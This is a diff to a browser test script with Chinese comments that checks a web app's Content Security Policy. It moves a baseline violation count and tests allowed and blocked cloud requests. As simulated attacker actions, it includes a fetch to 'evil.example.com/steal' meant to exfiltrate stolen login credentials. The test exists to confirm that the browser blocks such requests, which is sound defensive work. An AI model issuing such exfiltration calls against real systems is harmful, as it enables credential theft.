@@ -102,6 +102,8 @@ try {
   }));
   check("C 在 CSP 下真 Pyodide 能运行 Python（print(6 * 7) → 42）", /42/.test(py.out) && !py.error, JSON.stringify(py));
 
+  // 先记下“应用自身正常运行”的基线：下面任何故意触发的拦截（包括正式产物上访问测试域）都发生在它之后，不会被算成应用自身的违规
+  const before = await page.evaluate(() => window.__csp.length);
   const sb = await page.evaluate((o) => fetch(o + "/auth/v1/health").then((r) => r.status, (e) => "blocked:" + e.message), TEST_CLOUD_ORIGIN);
   const prod = await page.evaluate((o) => fetch(o + "/auth/v1/health").then((r) => r.status, (e) => "blocked:" + e.message), `https://${PROD_HOST}`);
   check("C 发往允许的正式云项目的请求放行（只由本地拦截应答，不调用真实 Auth 服务）", prod === 200 && prodHits >= 1, String(prod));
@@ -109,7 +111,6 @@ try {
   else check("C 正式构建：发往测试域 fake.supabase.test 的请求被拦（正式 CSP 里没有它）", /^blocked/.test(String(sb)) && supabaseHits === 0, String(sb));
 
   // 不在 Playwright 自动化里正常发生、但攻击者会做的三件事：都必须被拦
-  const before = await page.evaluate(() => window.__csp.length);
   const evil = await page.evaluate(() => fetch("https://evil.example.com/steal").then(() => "sent", () => "blocked"));
   check("C 发往别的网站的请求被拦（偷到的登录凭证发不出去）", evil === "blocked" && evilHits === 0, evil);
   const other = await page.evaluate(() => fetch("https://someone-else.supabase.co/rest/v1/x").then(() => "sent", () => "blocked"));
